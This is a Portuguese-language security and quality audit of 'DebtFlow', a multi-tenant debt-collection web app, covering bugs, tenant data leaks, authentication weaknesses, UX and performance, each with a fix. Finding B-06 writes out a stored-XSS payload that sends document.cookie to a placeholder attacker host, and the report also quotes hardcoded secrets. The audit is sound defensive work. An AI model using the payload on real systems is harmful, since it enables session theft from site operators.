# Auditoria Técnica — DebtFlow

**Sistema:** DebtFlow Admin v2.0.0 — gestão multi-tenant de dívidas e cobranças
**Stack:** Next.js 15 · React 19 · MongoDB/Mongoose · JWT (jose) · bcrypt · Vercel Cron · Evolution API (WhatsApp)
**Data:** 18/06/2026
**Modo:** somente leitura — nenhum arquivo foi alterado.

Análise conduzida sob seis óticas: CTO, QA Sênior, Performance Web, UX/UI, Product Manager e Auditor de Software.

Legenda: 🔴 Crítico · 🟠 Importante · 🟢 Opcional

---

## Resumo executivo

O DebtFlow tem uma camada de apresentação madura e polida (toasts, estados de carregamento por botão, validação de formulário, design coeso, multi-tenant intencional, cookies `httpOnly` + bcrypt + JWT). Porém o **núcleo financeiro e o motor de automação contêm falhas que perdem dinheiro, vazam dados entre clientes e, em parte, simplesmente não funcionam em produção.** A automação de cobrança (scheduler) está, na prática, morta por um erro de validação. Há ainda XSS armazenado e autenticação sem proteção contra força bruta. São problemas que impedem a venda do produto no estado atual.

Os pontos fortes são reais e devem ser preservados; os bloqueadores estão concentrados em ~8 itens corrigíveis.

---

## 1. Bugs, lógica e segurança

### 🔴 B-01 — O scheduler quebra sempre (automação inteira morta)
- **Onde:** `lib/scheduler.js`, função `log()` (linha ~88): `Activity.create({ text, type })` — **sem `tenant`**. O schema `lib/models/Activity.js` define `tenant: { required: true }`.
- **Impacto:** Toda vez que o scheduler tenta registrar qualquer evento (cobrança gerada, aviso, juros), o `Activity.create` lança `ValidationError`. Como não há `try/catch` em volta, `runScheduler()` aborta com 500. Como o `debt.save()` fica **depois** do loop, nada é persistido: na próxima execução o motor repete tudo do zero. Se já houver credencial de WhatsApp configurada, é possível **reenviar a mesma mensagem ao primeiro devedor a cada execução** e nunca avançar. A automação central do produto não funciona.
- **Como reproduzir:** Configurar `MONGODB_URI`/`CRON_SECRET`, ter ao menos uma parcela vencendo hoje, chamar `GET /api/cron/scheduler` com o Bearer correto → resposta 500.
- **Como corrigir:** Propagar o `tenant` da dívida para `log(text, type, tenant)` e gravar `Activity.create({ tenant, text, type })`. Envolver cada iteração em `try/catch` para que uma dívida com erro não derrube o lote. Mover/garantir `debt.save()` por dívida antes de logar.

### 🔴 B-02 — Vazamento entre tenants no scheduler
- **Onde:** `lib/scheduler.js` → `runScheduler()`: `Settings.findOne({ key: 'global' })` (sem filtro de `tenant`) e `Debt.find({ status: { $ne: 'paid' } })` (todos os tenants juntos).
- **Impacto:** O motor pega **um único** documento de settings (o de um tenant qualquer) e usa essa URL/instância/API Key e templates de WhatsApp para cobrar **devedores de todos os tenants**. Em um SaaS multi-cliente isso significa enviar mensagens dos clientes da "Loja" pela conta de WhatsApp do "Miguel" — vazamento de dados e cobrança pela conta errada.
- **Como reproduzir:** Cadastrar 2 tenants com settings distintos e dívidas em cada; rodar o scheduler → todas as mensagens saem com a config do primeiro settings encontrado.
- **Como corrigir:** Iterar por tenant: carregar `Settings` por tenant e processar `Debt.find({ tenant, status: { $ne: 'paid' } })` dentro desse contexto.

### 🔴 B-03 — Saldo "evapora" na última parcela (perda de dinheiro)
- **Onde:** `app/api/debts/[id]/skip/[idx]/route.js` e `.../pay/[idx]/route.js`. O carry (saldo + juros) é transferido para `nextInst = installmentList.find(j > i && status aberto)`. Se a parcela for a **última em aberto**, `nextInst` é `undefined` e o valor simplesmente não é transferido a lugar nenhum.
- **Impacto:** "Não Pagou" ou pagamento parcial na última parcela faz o saldo devido **desaparecer** do sistema, e a dívida ainda é marcada como quitada (ver B-04). Perda financeira direta e silenciosa.
- **Como reproduzir:** Dívida de 2 parcelas, pagar a 1ª, depois "Não Pagou" na 2ª → dívida vira "Quitado" e o valor não aparece em lugar nenhum.
- **Como corrigir:** Quando não houver próxima parcela, criar uma parcela extra (rolagem) ou manter a parcela como `overdue`/`open` com o saldo, e **não** marcar a dívida como paga enquanto houver saldo.

### 🔴 B-04 — `skipped` conta como "quitado"
- **Onde:** `pay`, `skip`, `[id]` (PUT) e `scheduler`: `allSettled = every(status ∈ ['paid','partial','skipped'])`.
- **Impacto:** Uma parcela marcada como "Não Pagou" (`skipped`) entra no conjunto de "liquidadas". Se todas as parcelas estiverem pagas/parciais/skipped, a dívida vira `status: 'paid'` mesmo havendo dinheiro em aberto. Distorce KPIs, status e o modal de "Cliente Finalizado".
- **Como reproduzir:** Ver B-03; ou skip em todas as parcelas → dívida "Quitada".
- **Como corrigir:** Tratar `skipped` como pendente/atrasado para fins de quitação; só considerar quitada quando o saldo real for zero.

### 🔴 B-05 — Autenticação frágil para um app financeiro com PII
- **Onde:** `lib/auth.js` (`resolveLogin`), `app/api/auth/route.js`, `app/login/page.js`.
- **Detalhes:** (a) login **só por senha**, sem usuário/e-mail; (b) compara a senha digitada contra **todos** os tenants via `bcrypt.compare` em loop (O(n), e qualquer senha que bata com qualquer tenant entra); (c) **nenhum rate-limit / lockout / captcha** — só um `setTimeout(400ms)`; (d) segredo de sessão com **fallback hardcoded** (`'fallback-dev-secret-troque-em-producao'`).
- **Impacto:** Força bruta trivial sobre um sistema que guarda nomes, telefones, endereços e valores de devedores. Se `SESSION_SECRET` não for definido em produção, **qualquer pessoa pode forjar um JWT** e se autenticar como master.
- **Como corrigir:** Adicionar identificador de tenant no login; rate-limit/lockout por IP+conta; remover o fallback do segredo (falhar o boot se ausente); idealmente 2FA para o master.

### 🔴 B-06 — XSS armazenado no feed de atividades e nos modais
- **Onde:** `app/page.js` linha ~1578 (`<div dangerouslySetInnerHTML={{ __html: act.text }} />`) e ~1435 (`gcData.msg`). Os textos são montados no backend como ``Nova divida: <strong>${name}</strong> - ${product}`` com `name`/`product` **sem sanitização** (`app/api/debts/route.js`, etc.).
- **Impacto:** Um devedor cadastrado com nome `<img src=x onerror="fetch('//evil/?c='+document.cookie)">` executa script quando o operador abrir Atividades. Em app financeiro é vetor de roubo de sessão/ações no contexto do admin.
- **Como reproduzir:** Criar dívida com nome contendo HTML/JS e abrir a aba Atividade.
- **Como corrigir:** Não usar `dangerouslySetInnerHTML` com dados do usuário. Renderizar texto puro e usar componentes React para o negrito, ou sanitizar (DOMPurify) e escapar a entrada na origem.

### 🟠 B-07 — Endpoint `/api/seed` perigoso
- **Onde:** `app/api/seed/route.js` — secret **hardcoded** (`'seed-miguel-2026'`), grava sempre `tenant: 'miguel'`, usa `insertMany` sem limpar.
- **Impacto:** Qualquer sessão válida pode injetar 30 dívidas fictícias no tenant `miguel` (independente do próprio tenant) e duplicar a cada chamada. Em produção, contaminação de dados.
- **Como corrigir:** Remover o endpoint do build de produção (ou protegê-lo por role master + variável de ambiente) e nunca fixar tenant.

### 🟠 B-08 — Chave de API do WhatsApp em texto puro e exposta ao browser
- **Onde:** `lib/models/Settings.js` (`apiKey` em texto puro) e `app/api/settings` (GET) cujo `toJSON` devolve `apiKey` ao cliente; `app/page.js` faz chamadas diretas à Evolution API a partir do navegador com a chave.
- **Impacto:** Segredo de integração trafega para o front e fica visível em DevTools/responses. Comprometimento da conta de WhatsApp do cliente.
- **Como corrigir:** Manter a `apiKey` apenas no servidor; nunca devolvê-la no GET (mascarar); fazer os envios sempre via backend (proxy), não direto do browser.

### 🔴 B-09 — Editar uma dívida sempre regenera as parcelas (vencimentos embaralhados)
- **Onde:** `app/api/debts/[id]/route.js` (PUT). Compara `String(debt.createdAt).slice(0,10)` com `startDate`. No servidor `debt.createdAt` é um **objeto `Date`** (Mongoose `timestamps`), então `String(Date)` produz `"Thu Jun 18 2026..."` e o `.slice(0,10)` vira `"Thu Jun 1"` — **nunca** igual a `"2026-06-18"`. Logo `needsRegen` é **sempre true**.
- **Impacto:** Qualquer edição — até mudar só o telefone ou uma observação — **regenera toda a lista de parcelas**, usando uma segunda versão de `generateInstallments` (a deste arquivo) que **não** tem a lógica "smart first month" da criação. Resultado: os vencimentos pendentes mudam de data sem o operador pedir.
- **Como reproduzir:** Criar dívida, abrir, mudar só a observação, salvar → comparar as datas das parcelas pendentes antes/depois.
- **Como corrigir:** Separar a "data de início" do negócio do `createdAt` do ORM (ver B-10); comparar datas normalizadas (`YYYY-MM-DD`) de forma consistente; só regenerar quando total/parcelas/dia/início realmente mudarem; unificar `generateInstallments` (ver B-12).

### 🟠 B-10 — Conflação entre "data de início" e `createdAt` do Mongoose
- **Onde:** `lib/models/Debt.js` usa `{ timestamps: true }`; as rotas gravam `createdAt: startDate` (string) e leem de volta como data de início. O próprio comentário do PUT admite "Mongoose coerce para Date".
- **Impacto:** O campo de domínio (quando a dívida começou) é misturado ao timestamp do registro. Na edição, a "Data de Início" exibida tende a ser a data de criação do registro, não a escolhida. Fonte raiz de B-09 e de bugs de data difíceis de rastrear.
- **Como corrigir:** Criar um campo próprio `startDate: String 'YYYY-MM-DD'` no schema e deixar `createdAt` como timestamp puro do Mongoose.

### 🟠 B-11 — Arredondamento das parcelas não fecha com o total
- **Onde:** `generateInstallments` (em ambas as rotas e no seed): `instValue = round(total / n, 2)` para **todas** as parcelas.
- **Impacto:** `100,00 / 3 = 33,33 × 3 = 99,99` — falta 1 centavo (ou sobra, conforme o caso). Em volume, divergência entre "total da dívida" e a soma das parcelas; reconciliação contábil incorreta.
- **Como corrigir:** Distribuir o resíduo (ex.: última parcela = `total − (n−1)×instValue`).

### 🟠 B-12 — `generateInstallments` duplicado e divergente
- **Onde:** `app/api/debts/route.js` (com "smart first month") vs `app/api/debts/[id]/route.js` (sem). Lógica financeira ainda duplicada em `lib/financialLogic.mjs` e **reimplementada inline** em `app/page.js` (cálculo de juros mensais).
- **Impacto:** Criar e editar produzem cronogramas diferentes; correções precisam ser feitas em 3+ lugares; os testes cobrem a versão "pura" que **não é a usada em produção** (as rotas não importam `financialLogic.mjs`). Falsa sensação de cobertura.
- **Como corrigir:** Extrair uma única fonte de verdade (ex.: `financialLogic.mjs`) e importá-la em todas as rotas e no front.

### 🟠 B-13 — Pagamentos/skips sem idempotência (corrompem valores se repetidos)
- **Onde:** `pay/[idx]` e `skip/[idx]`. Nenhum verifica o status atual da parcela antes de aplicar carry/crédito.
- **Impacto:** Clicar "Pagar"/"Não Pagou" duas vezes, ou um duplo-clique/retry de rede, **reaplica** o carry para a próxima parcela e reescreve valores — corrompendo o saldo. Não há trava de concorrência (read-modify-write sem transação): duas requisições simultâneas geram lost update.
- **Como corrigir:** Rejeitar a operação se a parcela já estiver em estado final; usar atualização atômica/transação (`session`) ou versionamento otimista.

### 🟠 B-14 — Botão "Verificar agora" desloga o usuário
- **Onde:** `app/page.js` `runSchedulerNow()` → `POST /api/cron/scheduler`. O `middleware.js` exige `Authorization: Bearer CRON_SECRET` para **esse path em qualquer método**. O browser não envia esse header → 401 → o helper `api()` faz `router.push('/login')`.
- **Impacto:** Clicar "Verificar agora" em Configurações **derruba o operador para a tela de login**. Funcionalidade anunciada que não funciona.
- **Como corrigir:** Permitir POST autenticado por cookie de sessão (separar a checagem por método no middleware) ou remover o botão.

### 🟠 B-15 — Importar JSON é destrutivo/incompleto ("backup" que não restaura)
- **Onde:** `app/page.js` `importData()` — recria cada dívida só com campos básicos, **descarta `installmentList` e todo o histórico de pagamentos**; sem deduplicação (importar 2× duplica); itens sem telefone falham silenciosamente (telefone é obrigatório no POST).
- **Impacto:** O "Exportar/Importar" sugere backup, mas a restauração perde o estado financeiro e pode duplicar a base.
- **Como corrigir:** Endpoint de importação que preserve parcelas/pagamentos, com upsert por id e relatório de itens importados/ignorados.

### 🟠 B-16 — Excluir tenant deixa dados órfãos (e reexpõe a quem reusar o slug)
- **Onde:** `app/api/admin/tenants/[id]/route.js` (DELETE) — remove só o `Tenant`. O próprio modal admin admite "os dados não serão apagados".
- **Impacto:** Dívidas/atividades/settings ficam órfãs. Se outra pessoa criar um tenant com o **mesmo slug**, herda os dados do anterior — vazamento de PII entre clientes diferentes.
- **Como corrigir:** Cascata (apagar ou arquivar dados do tenant) e/ou impedir reuso de slug; alinhar à LGPD (direito ao esquecimento).

### 🟢 B-17 — Cron real diverge da documentação
- **Onde:** `vercel.json`: `"schedule": "0 8 * * *"` (1×/dia, 08:00 UTC). UI e comentários dizem "a cada hora".
- **Impacto:** Expectativa de cobrança horária não se cumpre; avisos de atraso saem com até ~24h de atraso. Confunde operação.
- **Como corrigir:** Alinhar agenda real ↔ documentação/UI.

### 🟢 B-18 — `.env.local.example` não bate com o código
- **Onde:** O exemplo cita `ADMIN_PASSWORD` e `NEXTAUTH_URL`; o código usa `MASTER_PASSWORD`, `ADMIN_PASSWORD_MIGUEL`, `ADMIN_PASSWORD_LOJA`, `SESSION_SECRET`, `CRON_SECRET`.
- **Impacto:** Quem seguir o exemplo não consegue logar. Onboarding/deploy quebrado.
- **Como corrigir:** Atualizar o `.example` com as variáveis realmente lidas.

### 🟢 B-19 — Validação inconsistente entre criar e editar
- **Onde:** `POST /api/debts` valida obrigatórios e `dueDay` 1–28; `PUT /api/debts/[id]` **não** revalida (aceita `name` undefined, `dueDay` fora do range etc.).
- **Como corrigir:** Compartilhar a mesma validação (schema único) em POST e PUT.

### 🟢 B-20 — Fuso horário em UTC para "hoje"
- **Onde:** `scheduler.js` (`toDateOnly(new Date())`), KPIs e calendário usam UTC. O negócio é Brasil (UTC-3).
- **Impacto:** Entre 21:00–24:00 (horário local) o "hoje" em UTC já virou o dia seguinte → vencimentos/atrasos podem deslocar 1 dia.
- **Como corrigir:** Fixar timezone `America/Sao_Paulo` nos cálculos de data.

### 🟢 B-21 — Penalidade de atraso aplicada uma única vez
- **Onde:** `scheduler.js` — `penaltyApplied` impede reaplicar juros mesmo com meses de atraso.
- **Impacto:** Para regra de juros/mês, o atraso prolongado não acumula. Pode ser intencional, mas conflita com a mensagem "juros de atraso".
- **Como corrigir:** Decidir explicitamente a regra de negócio e documentá-la/implementá-la.

---

## 2. UX (Experiência do Usuário)

- 🟠 **Login só com senha:** não há indicação de qual conta/loja está entrando, sem "mostrar senha", sem "esqueci a senha". Confuso e arriscado num app multi-tenant.
- 🟠 **"Verificar agora" desloga** (B-14): pior tipo de fricção — a ação tira o usuário do sistema.
- 🟠 **Logout acidental:** o avatar na sidebar com "Clique para sair" desloga sem confirmação ao primeiro clique.
- 🟠 **Backup enganoso** (B-15): operador acredita ter um backup completo que, na verdade, perde pagamentos.
- 🟢 **Busca limitada:** filtra só por nome/produto, não por telefone; sem paginação para bases grandes.
- 🟢 **Calendário sem navegação:** mostra só mês atual + atrasados; impossível ver vencimentos futuros.
- 🟢 **Pagamento à maior (overpayment) sem etapa de revisão** (só o parcial tem preview); sem bloquear valor 0 ou data futura.
- 🟢 **"Limpar histórico" sem confirmação** (diferente do "Limpar tudo", que confirma) — inconsistência destrutiva.
- 🟢 **Feedback de erro irregular:** várias ações só dão toast em caso de sucesso; falhas de rede ficam silenciosas.
- 🟢 **Mobile:** alvos de toque pequenos (botões de 11px nas parcelas); na tabela desktop o clique na linha + `stopPropagation` é frágil.
- 🟢 **Acessibilidade:** status comunicado só por cor (sem texto/ícone redundante em alguns pontos); modais sem *focus trap* (embora Esc feche); contraste baixo em textos "muted".

**Pontos positivos de UX:** loading states por botão, toasts informativos, validação inline com mensagens claras, painéis de KPI clicáveis com detalhamento, modal de confirmação para pagamento parcial, celebração ao quitar — boa atenção ao detalhe.

---

## 3. Interface

- 🟢 **Hierarquia/identidade visual coesas** — dashboard, badges de status e cards são claros e profissionais (ponto forte).
- 🟠 **Estilos inline massivos** (centenas de objetos `style={{…}}`) em vez de classes utilitárias/CSS — prejudica consistência, manutenção e tamanho do bundle.
- 🟢 **Gráfico de barras** sem eixo/valores rotulados — legibilidade limitada; serve como enfeite mais que análise.
- 🟢 **Estados de carregamento** bem cobertos (spinner inicial + `btnLoading`) — manter.
- 🟢 **Feedback ao usuário** via toasts é consistente e agradável.
- 🟢 **SVGs repetidos inline** (mesmos ícones colados várias vezes) — extrair para componentes.

---

## 4. Performance

- 🟠 **`app/page.js` é um único componente client de 1.782 linhas** contendo o app inteiro. `search` mora no estado raiz → cada tecla digitada **re-renderiza toda a árvore** (dashboard, tabelas, painéis). `fetchAll()` recarrega **tudo** (dívidas+atividade+settings+me) após cada ação.
- 🟠 **Lógica financeira triplicada** (rotas inline, `financialLogic.mjs`, `page.js` inline) — custo de manutenção e divergência (B-12).
- 🟠 **Scheduler N+1/sequencial:** loop com `await` por parcela (`sendWhatsApp` + `log` + `countDocuments` + `find`/`deleteMany` de limpeza a cada log). Não escala e degrada o tempo do cron.
- 🟢 **Sem índices compostos** para os acessos reais (ex.: `Debt {tenant, status}`, `Activity {tenant, createdAt}` para o `sort+limit`).
- 🟢 **Recalculo no client** de KPIs/calendário varrendo todas as parcelas a cada render (ok no tamanho atual, não escala para milhares de dívidas).
- 🟢 **Código morto:** `BottomNav` definido e nunca usado; versão legada inteira na raiz (`app.js`, `index.html`, `scheduler.js`, `whatsapp.js`, ~2.380 linhas) duplicando o produto.

---

## 5. Qualidade geral / arquitetura

- 🟠 **Duplicação de regra de negócio** em múltiplas camadas (ver B-12) — o maior risco de manutenção.
- 🟠 **Testes não cobrem o código de produção:** 69 testes exercitam `financialLogic.mjs`, mas as rotas `pay`/`skip`/scheduler reimplementam a lógica e **não têm** testes de integração. Os bugs B-01, B-03, B-04, B-11, B-13 passariam despercebidos.
- 🟠 **Mistura de responsabilidades** no front (UI + fetch + regra financeira + formatação) num só arquivo gigante.
- 🟢 **Confiança em headers (`x-tenant`/`x-role`)** definidos pelo middleware: aceitável porque o middleware sempre sobrescreve, mas frágil — qualquer rota acessível fora do `matcher` herdaria o `default`. Documentar/centralizar a extração de identidade.
- 🟢 **Tratamento de erros heterogêneo** entre rotas (algumas retornam `err.message` cru ao cliente).
- 🟢 **Ausência de trilha de auditoria robusta** (quem fez o quê), exigível em finanças.

---

## Top 10 — melhorias mais importantes

1. 🔴 Corrigir o **scheduler** (tenant no `Activity.create` + `try/catch` + `save` por dívida) — sem isso a automação não roda (B-01).
2. 🔴 **Isolar tenants no scheduler** (settings e dívidas por tenant) — eliminar vazamento de cobrança (B-02).
3. 🔴 **Não perder saldo na última parcela** e **não tratar `skipped` como quitado** (B-03, B-04).
4. 🔴 Eliminar o **XSS armazenado** (parar de usar `dangerouslySetInnerHTML` com dados do usuário) (B-06).
5. 🔴 **Fortalecer a autenticação**: remover fallback de `SESSION_SECRET`, adicionar rate-limit/lockout e identificador de login (B-05).
6. 🔴 Corrigir a **regeneração indevida de parcelas na edição** e separar `startDate` de `createdAt` (B-09, B-10).
7. 🟠 **Unificar a lógica financeira** numa única fonte e importá-la em todas as camadas (B-12).
8. 🟠 Tornar **pagamentos/skips idempotentes e transacionais** (B-13).
9. 🟠 **Proteger/remover `/api/seed`** e **cascatear a exclusão de tenant** (B-07, B-16).
10. 🟠 Criar **testes de integração** das rotas financeiras e do scheduler (cobrir B-01/03/04/11/13).

## Top 10 — melhorias de UX

1. Consertar o "Verificar agora" para não deslogar (B-14).
2. Tornar o Exportar/Importar um backup realmente fiel (preserva pagamentos) (B-15).
3. Confirmação antes do logout (evitar saída acidental pelo avatar).
4. Login com identificação do tenant + "mostrar senha".
5. Confirmação ao "Limpar histórico" (paridade com "Limpar tudo").
6. Navegação de meses no calendário de vencimentos.
7. Busca também por telefone + paginação na lista de dívidas.
8. Etapa de revisão também para pagamento à maior; bloquear valor 0/data futura inválida.
9. Feedback de erro consistente em todas as ações (não só sucesso).
10. Acessibilidade: status com texto+ícone (não só cor), focus trap nos modais, melhorar contraste.

## Top 10 — otimizações de performance

1. Quebrar `app/page.js` em componentes por página/rota (reduzir re-render global).
2. Isolar o `search` (estado local/`useDeferredValue`) para não re-renderizar tudo a cada tecla.
3. Atualizar estado localmente após ações em vez de `fetchAll()` recarregar tudo.
4. Unificar e importar a lógica financeira (remove recomputação/divergência).
5. Reescrever o scheduler em lote (consultas agregadas; evitar N+1 e `countDocuments` por log).
6. Índices compostos: `Debt {tenant, status}`, `Activity {tenant, createdAt}`.
7. Memoizar/extrair os SVGs e componentes pesados; reduzir estilos inline.
8. Remover código morto (`BottomNav`) e a versão legada da raiz.
9. Paginação/virtualização nas listas (escala para milhares de registros).
10. Cache/headers adequados nos GETs de leitura e `lean()` onde não há mutação.

---

## Nota geral do sistema: **5,0 / 10**

A camada visual e de interação está em nível 8–9: polida, consistente e agradável. O que puxa a nota para baixo é o **núcleo do produto** — finanças e automação — onde existem perda de dinheiro (B-03/B-04), automação que não funciona (B-01), vazamento entre clientes (B-02), XSS (B-06) e autenticação insuficiente (B-05). Para um software que **lida com dinheiro e dados pessoais e será vendido**, esses itens pesam mais do que a qualidade da interface. Corrigidos os ~8 bloqueadores, a nota realista subiria para a faixa de 7,5–8.

---

## O que impediria vender este sistema para clientes reais hoje

1. **A automação de cobrança não funciona** (B-01) — o principal valor prometido (cobrar sozinho) está quebrado.
2. **Vazamento entre clientes** (B-02, B-16) — inaceitável em SaaS multi-tenant; risco legal e de confiança.
3. **Perda silenciosa de saldo** (B-03, B-04) — um sistema financeiro que "esquece" dívidas é inviável comercialmente.
4. **Segurança insuficiente** (B-05, B-06, B-07, B-08) — auth sem proteção contra força bruta, segredo com fallback, XSS armazenado e API Key exposta. Reprova qualquer due diligence.
5. **Conformidade/LGPD** — dados pessoais de devedores sem retenção/eliminação adequada (B-16), sem trilha de auditoria, e cobrança via WhatsApp sem gestão de consentimento/opt-out.
6. **Backup/restore não confiável** (B-15) — sem garantia de recuperação de dados, nenhum cliente sério adota.
7. **Edição corrompe cronograma** (B-09) — operações cotidianas alteram vencimentos sem intenção.
8. **Confiabilidade não comprovada** — os testes não cobrem o código que roda em produção; sem isso não há garantia de exatidão dos valores cobrados.

**Conclusão:** o produto está perto de uma boa demo, mas longe de "pronto para vender". O caminho é curto e concentrado: estabilizar o motor financeiro e o scheduler, fechar as falhas de segurança/multi-tenant e cobrir tudo com testes de integração. Feito isso, a base de UI já existente sustenta um produto comercializável.
